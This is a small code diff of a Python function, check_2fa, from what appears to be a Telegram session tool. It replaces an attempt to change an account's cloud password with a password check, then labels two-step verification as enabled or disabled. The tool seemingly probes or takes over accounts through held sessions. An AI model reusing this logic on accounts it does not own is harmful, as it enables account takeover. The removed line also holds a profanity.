@@ -308,11 +308,10 @@ async def check_2fa(session):
                 except Exception as e:
                     print(e)    
                 try:
-                    await stark.change_cloud_password("idkbsdk", "madarchod")
+                    await stark.check_password("idkwillornot")
                     i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ"    
                 except Exception as e:
-                    print(e)
-            
+                    print(e)            
                     i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ"
                                    
     except Exception as idk:
